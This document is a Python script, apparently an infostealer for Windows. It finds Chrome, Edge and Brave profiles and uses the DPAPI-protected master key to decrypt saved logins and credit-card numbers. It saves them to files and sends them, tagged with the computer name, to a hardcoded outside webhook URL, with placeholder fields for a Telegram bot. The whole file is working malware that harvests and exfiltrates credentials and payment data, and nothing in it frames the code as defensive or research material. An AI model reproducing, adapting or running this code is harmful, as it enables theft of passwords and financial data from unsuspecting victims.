import os
import base64
import json
import shutil
import sqlite3
import requests
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

print("imports done")

# Get the path of the local app data
appdata = os.getenv("LOCALAPPDATA")

# Define the paths of the different browsers
browsers = {
    "google-chrome-sxs": appdata + "\\Google\\Chrome SxS\\User Data",
    "google-chrome": appdata + "\\Google\\Chrome\\User Data",
    "microsoft-edge": appdata + "\\Microsoft\\Edge\\User Data",
    "brave": appdata + "\\BraveSoftware\\Brave-Browser\\User Data",
}
print("paths defined")

# Define the queries and information for different types of data
data_queries = {
    "login_data": {
        "query": "SELECT action_url, username_value, password_value FROM logins",
        "file": "\\Login Data",
        "columns": ["URL", "Email", "Password"],
        "decrypt": True,
    },
    "credit_cards": {
        "query": "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM "
                 "credit_cards",
        "file": "\\Web Data",
        "columns": ["Name On Card", "Card Number", "Expires On", "Added On"],
        "decrypt": True,
    },
}


# Function to get the master key for decryption
def get_master_key(path: str):
    if not os.path.exists(path):
        return
    if "os_crypt" not in open(path + "\\Local State", "r", encoding="utf-8").read():
        return
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


# Function to decrypt the password
def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


# Function to save the results to a file
def save_results(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content is not None:
        file_path = f"{browser_name}/{type_of_data}.txt"
        with open(file_path, "w", encoding="utf-8") as file:
            # Add headers to the file
            file.write(f"[Type: {type_of_data.replace('_', ' ').capitalize()}]\n")

            # Write the content
            file.write(content)
        print(f"\t [*] Saved in {file_path}")
        return file_path  # Return the file path
    else:
        print(f"\t [-] No Data Found!")
        return None


# Function to get the data from the database
def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, "temp_db")
    conn = sqlite3.connect("temp_db")
    cursor = conn.cursor()
    cursor.execute(type_of_data["query"])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data["decrypt"]:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if type_of_data == "history":
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += (
                "\n".join(
                    [f"{col}: {val}" for col, val in zip(type_of_data["columns"], row)]
                )
                + "\n\n"
        )
    conn.close()
    os.remove("temp_db")
    return result


# Function to convert Chrome time to a readable format
def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime(
        "%d/%m/%Y %H:%M:%S"
    )


# Function to check which browsers are installed
def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available


# Function to format the data for readability
def format_data_for_output(columns, values):
    formatted_data = "\n".join([f"{col}: {val}" for col, val in zip(columns, values)])
    return f"\n{formatted_data}\n\n"


# Function to send a message to a webhook
def send_webhook_message(webhook_url, lines):
    # Join the lines to create a single formatted message
    formatted_message = "".join(lines)

    # Define the payload (data) to be sent in the POST request
    payload = {"text": formatted_message}

    # Send a POST request to the webhook URL with the payload
    response = requests.post(webhook_url, json=payload)

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        print("Message sent to webhook successfully.")
    else:
        print(f"Failed to send message to webhook. Status code: {response.status_code}")


if __name__ == "__main__":
    available_browsers = installed_browsers()
    chat_id = ""  # Replace with your Telegram chat ID (if still needed)
    bot_token = ""  # Replace with your Telegram bot token (if still needed)
    webhook_url = "https://pikminthrowaway1.000webhostapp.com/webhook.php"  # Replace with your webhook URL

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        pc_name = os.environ['COMPUTERNAME']  # Get the PC name
        print(f"Getting Stored Details from {browser} on {pc_name}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            data = get_data(browser_path, "Default", master_key, data_type)

            if data:
                print(data)  # Display data to the console

                # Split data into lines for better readability
                data_lines = data.split("\n\n")

                # Save the formatted data to a file
                file_path = save_results(browser, data_type_name, data)

                if file_path:
                    # Read the contents of the file
                    with open(file_path, "r", encoding="utf-8") as output_file:
                        data_to_send = output_file.read()

                    # Add PC Info headers
                    pc_info_header = f"[Type: PC Info] [Computer: {pc_name}]"
                    formatted_data = f"{pc_info_header}\n[Type: {data_type_name.replace('_', ' ').capitalize()}]\n{data_to_send}"

                    # Sending data to the webhook with correct formatting
                    response = requests.post(webhook_url, data=formatted_data, headers={'Content-Type': 'text/plain'})

                    if response.status_code == 200:
                        print('Webhook request sent successfully')
                    else:
                        print(f'Error sending webhook request. Status code: {response.status_code}')

            print("\n----------\n")

    input("Press ENTER to exit...")